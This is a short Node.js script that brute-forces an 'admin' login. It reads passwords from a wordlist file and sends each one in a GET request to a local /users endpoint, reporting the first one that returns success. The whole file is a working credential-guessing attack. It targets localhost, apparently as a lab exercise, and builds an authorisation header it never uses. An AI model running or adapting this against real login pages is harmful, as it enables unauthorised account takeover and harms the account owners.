const request = require('request');
const fs = require('fs');

const passwordsList = fs.readFileSync('./passwords.txt').toString().replace('\r', '\n').split('\n');

for (let j = 0; j < passwordsList.length; j++) {
    const auth = 'Basic ' + Buffer.from('admin' + ':' + passwordsList[j]).toString('base64');
    const options = {
        url: `http://localhost:4000/users?login=admin&pass=${passwordsList[j]}`,
    };
    request.get(options, function (error, response, body) { 
        // console.log("Trying password: " + passwordsList[j] + "\n" + " status code: " + response.statusCode);
        if (!error && response.statusCode === 200) {
            console.log('Success! Username: ' + 'admin' + ' Password: ' + passwordsList[j]);
            process.exit();
        }
    });
};